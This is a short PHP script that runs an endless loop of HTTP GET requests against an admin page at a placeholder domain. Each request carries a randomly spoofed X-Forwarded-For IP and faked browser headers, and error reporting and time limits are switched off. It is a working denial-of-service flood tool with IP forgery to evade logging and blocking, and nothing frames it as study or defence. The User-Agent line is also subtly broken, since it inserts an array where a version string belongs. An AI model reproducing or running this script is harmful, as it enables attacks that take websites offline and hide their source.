<?php
error_reporting(0);
set_time_limit(0);
 
$domain = 'site.com';
$path = '/admin/admin.php';
$port = 80;

while(1) {
	$ip = rand(188,254).'.'.rand(1,254).'.'.rand(1,254).'.'.rand(1,254);
	$socket = fsockopen($domain, "80", $errno, $errstr, 30);
	$header = "GET ".$path." HTTP/1.1\r\n";
	$header .= "Host: ".$domain."\r\n";
	$header .= "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 103; ru-ru; rv:1.8.1.16) Gecko/20080702 Firefox/" .range(13,16).".0.0.16\r\n";
	$header .= "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,image/jpg,image/gif,*/*;q=0.5\r\n";
	$header .= "Accept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3\r\n";
	$header .= "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n";
	$header .= "Keep-Alive: 310\r\n";
	$header .= "Proxy-Connection: keep-alive\r\n";
	$header .= "Referer: http://".$domain.$path."\r\n";
	$header .= "Content-Type: application/x-www-form-urlencoded\r\n";
	$header .= "X-Forwarded-For: ".$ip."\r\n";
	$header .= "Via: RK\r\n";
	$header .= "Connection: Close\r\n\r\n";
	 
	$send_header = fwrite($socket,$header);
	fclose($socket);
}
 
?>